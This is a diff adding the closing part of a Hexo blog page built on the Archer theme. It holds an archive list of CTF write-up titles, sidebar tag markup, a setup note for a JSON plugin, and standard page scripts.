+            <span class="archive-post-date">11/06</span><a class="archive-post-title" href="/2018/11/06/php伪协议/">php伪协议的一些总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/04</span><a class="archive-post-title" href="/2018/11/04/2018上海市大学生部分wp/">2018上海市大学生部分wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/03</span><a class="archive-post-title" href="/2018/11/03/ichunqiuweb/">ichunqiu web部分wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/02</span><a class="archive-post-title" href="/2018/11/02/nctf/">南邮ctf平台</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/27</span><a class="archive-post-title" href="/2018/10/27/安恒11月/">安恒杯11月份密码学部分wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/26</span><a class="archive-post-title" href="/2018/10/26/jarvisoj/">jarvisoj web部分wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/24</span><a class="archive-post-title" href="/2018/10/24/phpxuliehua/">PHP反序列化的一些例子</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/18</span><a class="archive-post-title" href="/2018/10/18/bugku/">bugCTF-web方向wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/16</span><a class="archive-post-title" href="/2018/10/16/ustc/">2018ustcCTF部分题目wp</a>
+        </li>
+    
+    </ul></div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="Crypto"><span class="iconfont-archer">&#xe606;</span>Crypto</span>
+    
+        <span class="sidebar-tag-name" data-tags="Analysis"><span class="iconfont-archer">&#xe606;</span>Analysis</span>
+    
+        <span class="sidebar-tag-name" data-tags="总结"><span class="iconfont-archer">&#xe606;</span>总结</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br>
+    1、请确保node版本大于6.2<br>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "Bling_Dog"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
